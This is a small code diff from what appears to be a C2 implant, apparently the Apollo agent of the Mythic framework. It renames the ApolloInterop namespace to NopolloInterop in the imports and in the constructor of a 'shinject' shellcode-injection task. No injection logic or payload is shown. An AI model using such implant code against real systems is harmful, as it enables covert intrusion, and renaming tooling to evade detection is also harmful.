@@ -6,9 +6,9 @@
 
 #if SHINJECT
 
-using ApolloInterop.Classes;
-using ApolloInterop.Interfaces;
-using ApolloInterop.Structs.MythicStructs;
+using NopolloInterop.Classes;
+using NopolloInterop.Interfaces;
+using NopolloInterop.Structs.MythicStructs;
 using System.Runtime.InteropServices;
 using System.Runtime.Serialization;
 
@@ -24,7 +24,7 @@ namespace Tasks
             [DataMember(Name = "shellcode-file-id")]
             public string Shellcode;
         }
-        public shinject(IAgent agent, ApolloInterop.Structs.MythicStructs.MythicTask data) : base(agent, data)
+        public shinject(IAgent agent, NopolloInterop.Structs.MythicStructs.MythicTask data) : base(agent, data)
         {
         }
 
